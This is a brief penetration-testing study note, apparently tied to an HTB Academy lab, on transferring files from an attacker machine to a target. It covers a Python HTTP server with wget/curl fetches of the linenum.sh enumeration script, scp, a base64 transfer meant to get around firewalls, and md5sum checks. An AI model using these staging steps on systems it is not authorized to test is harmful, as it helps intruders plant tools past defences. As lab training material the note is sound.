---
id: Transferring Files
aliases: []
tags:
  - Pentest/General/Transferring-Files
---

# Transferring files

- [HTB Academy - Transferring Files](https://academy.hackthebox.com/module/77/section/849)

## Python HTTP Server

Run a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
on the attacker machine and use **wget** or **curl** to download the file(s) to
the remote host

1. **Attacker**: Run Python HTTP server

```sh
sudo python3 -m http.server 8000
```

2. **Target**: Acquire the files from the remote host

```sh
wget http://10.10.14.1:8000/linenum.sh
```

```sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

## SCP

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

**Attacker**: Copy the file to the remote machine

```sh
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

## Base64

It may be not possible to transfer files if (for example) the remote host has
firewall protection.

1. **Attacker**: Encode the binary file to base64

```sh
base64 file.ext -w 0
```

2. **Target**: Copy the base64 string, decode it, and pipe it into a file

```sh
echo f0VMRgIBAQAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaiXSInmDwU | base64 -d > file.ext
```

## Validate File Transfers

Validate the format of the file

```sh
file file.ext
```

**Attacker**: Run a `md5sum` on the file

```sh
md5sum file.ext

321de1d7e7c3735838890a72c9ae7d1d file.ext
```

**Target**: Run `md5sum` to validate the hash

```sh
md5sum file.ext

321de1d7e7c3735838890a72c9ae7d1d file.ext
```
